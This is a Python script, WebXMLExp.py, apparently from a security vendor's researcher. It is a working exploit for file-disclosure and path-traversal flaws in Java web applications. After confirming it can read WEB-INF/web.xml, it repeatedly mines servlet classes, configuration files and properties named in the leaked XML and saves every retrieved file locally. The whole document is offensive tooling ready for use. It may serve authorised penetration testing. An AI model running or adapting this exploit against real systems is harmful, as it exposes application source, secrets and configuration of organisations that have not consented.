#
# 888       888          888     Y88b   d88P 888b     d888 888      8888888888                   
# 888   o   888          888      Y88b d88P  8888b   d8888 888      888                          
# 888  d8b  888          888       Y88o88P   88888b.d88888 888      888                          
# 888 d888b 888  .d88b.  88888b.    Y888P    888Y88888P888 888      8888888    888  888 88888b.  
# 888d88888b888 d8P  Y8b 888 "88b   d888b    888 Y888P 888 888      888        `Y8bd8P' 888 "88b 
# 88888P Y88888 88888888 888  888  d88888b   888  Y8P  888 888      888          X88K   888  888 
# 8888P   Y8888 Y8b.     888 d88P d88P Y88b  888   "   888 888      888        .d8""8b. 888 d88P 
# 888P     Y888  "Y8888  88888P" d88P   Y88b 888       888 88888888 8888888888 888  888 88888P"  
#                                                                                       888      
#                                                                                       888
# 	Copyright (c) 2022 Bogdan Calin (Invicti Security)
# 

import requests, sys, string, random, hashlib, os, pathlib, urllib.parse
import defusedxml.ElementTree as ET

proxies = {
   # 'http': 'http://127.0.0.1:8080',
   # 'https': 'http://127.0.0.1:8080',
}

PAYLOAD_MARK = "<INJECT-HERE>"

def sha256(input):
 	return hashlib.sha256(input.encode()).hexdigest()

def randomStr(count):
	return ''.join(random.choices(string.ascii_lowercase, k=count))

def getCustom404(orig_url):
	try:
		payload = "WEB-{0}/{1}.xml".format(randomStr(3).upper(), randomStr(5))
		url = orig_url.replace(PAYLOAD_MARK, payload)
		resp = requests.get(url, proxies=proxies)
		body = resp.text.replace(payload, "*").replace(urllib.parse.quote(payload), '*')
		return (resp.status_code, sha256(body))
	except BaseException as e:
		print("unable to determine custom404. maybe the URL is not valid? " +  str(e))
		return False

def testPayload(orig_url, payload, custom404):
	url = orig_url.replace(PAYLOAD_MARK, payload)
	resp = requests.get(url, proxies=proxies)
	body = resp.text.replace(payload, "*").replace(urllib.parse.quote(payload), '*')
	if resp.status_code != custom404[0] or resp.status_code == custom404[0] and sha256(body) != custom404[1]:
		return resp
	else:
		return False

def urlIsValid(orig_url, c404):		
	p = testPayload(orig_url, "WEB-INF/web.xml", c404)
	if p and "<web-app " in p.text:
		print("exploit url is valid")
		return True
	return False

def extractValuesFromMultiLineValue(value):
	payloads = []
	if value:
		value = value.strip()
		# handle multiline values
		if "\n" in value:
			lines = value.split("\n")
			for line in lines:
				line = line.strip()
				if line and line.startswith("/"):
					payloads.append(line)
		else:
			if value.startswith("/"):
				payloads.append(value)
		# handle classpath 
		if value.startswith("classpath:"):
			payloads.append("/WEB-INF/classes/".format(value))
			payloads.append("/WEB-INF/lib/".format(value))
	return payloads

def extractPathFromClassName(class_name, folder):
	return "/" + folder + "/classes/" + "/".join(class_name.split(".")) + ".class"

def extractNewPayloadsFromResponse(response):
	payloads = []
	# extracting new payloads from the XML response
	response = response.strip()
	if response.startswith("<"):
		try:
			tree = ET.fromstring(response)
			for elem in tree.iter():
				if elem.tag.endswith("param-value") or elem.tag.endswith("jsp-file"):
					values = extractValuesFromMultiLineValue(elem.text)
					if len(values) > 0:
						for v in values:
							if v not in payloads:
								payloads.append(v)
				if elem.tag.endswith("servlet-class"):
					path = extractPathFromClassName(elem.text, "WEB-INF")
					if path not in payloads:
						payloads.append(path)	
					path2 = extractPathFromClassName(elem.text, "BOOT-INF")
					if path2 not in payloads:
						payloads.append(path2)	
				if elem.tag.endswith("servlet-name"):
					path = "WEB-INF/{}-servlet.xml".format(elem.text)
					if path not in payloads:
						payloads.append(path)
					path = "WEB-INF/{}.properties".format(elem.text)
					if path not in payloads:
						payloads.append(path)
					path = "WEB-INF/{}-config.xml".format(elem.text)
					if path not in payloads:
						payloads.append(path)
					path = "WEB-INF/{}-config.yml".format(elem.text)
					if path not in payloads:
						payloads.append(path)
					path = "WEB-INF/{}-config.yaml".format(elem.text)
					if path not in payloads:
						payloads.append(path)				
					path = "WEB-INF/classes/{}.properties".format(elem.text)
					if path not in payloads:
						payloads.append(path)
					path = "WEB-INF/{}.yml".format(elem.text)
					if path not in payloads:
						payloads.append(path)
					path = "WEB-INF/{}.yaml".format(elem.text)
					if path not in payloads:
						payloads.append(path)
								
		except:
			pass						

	return payloads

def saveResponse(response, payload):
	if payload.startswith("/"):
		payload = payload[1:]

	path = os.path.join(os.getcwd(), "results", payload).replace("\\","/")

	safe_dir = os.getcwd()
	if os.path.commonprefix((os.path.realpath(path),safe_dir)) != safe_dir: 
		print(f"Not writing results for invalid path \"{path}\" (hack not the hacker)")
		return	

	print(" saving response to {}".format(path))

	p = pathlib.Path(path)
	if not os.path.exists(p.parent):
		os.makedirs(p.parent)

	f = open(path, "w+", encoding='utf-8')
	f.write(response.text)
	f.close()

def exploit(url, payloads):
	orig_url = url.replace("WEB-INF/web.xml", PAYLOAD_MARK)
	print("determine custom 404 ...")
	c404 = getCustom404(orig_url)

	if not c404:
		sys.exit()

	print("testing the exploit url ...")
	if not urlIsValid(orig_url, c404):
		print("exploit url is not valid! cannot find '<web-app ' in response.")
		sys.exit()

	processed_payloads = []
	iterations = 0

	while len(payloads) > 0 and iterations < 5:
		iterations += 1		
		print("testing {} payloads ...".format(len(payloads)))
		for payload in payloads:
			payloads.remove(payload)
			if payload not in processed_payloads:
				processed_payloads.append(payload)				
				p = testPayload(orig_url, payload, c404)
				if p:
					q = testPayload(orig_url, randomStr(5) + payload, c404)
					if not q:
						z = testPayload(orig_url, payload + randomStr(5), c404)
						if not z:
							p = testPayload(orig_url, payload, c404)
							if p:
								print("> {0}".format(p.url))
								saveResponse(p, payload)
								new_payloads = extractNewPayloadsFromResponse(p.text)
								if len(new_payloads) > 0:
									for np in new_payloads:
										if np not in processed_payloads and np not in payloads:
											payloads.append(np)

# main()
if __name__ == '__main__':
	if len(sys.argv) < 2:
		print("usage: python WebXMLExp.py <url_with_web_xml_exploit_or_inject_here_marker>")
		print('example: python WebXMLExp.py "http://127.0.0.1:8082/vulnerable/download.servlet?filename=WEB-INF/web.xml"')
		print('         python WebXMLExp.py "http://127.0.0.1:8082/vulnerable/download.servlet?filename=<INJECT-HERE>"')
		sys.exit()

	url = sys.argv[1].strip()
	if url:
		# read payloads.txt
		payloads = []
		with open("payloads.txt") as f:
			for line in f:
				line = line.strip()
				if line and line not in payloads:
					payloads.append(line)

		exploit(url, payloads)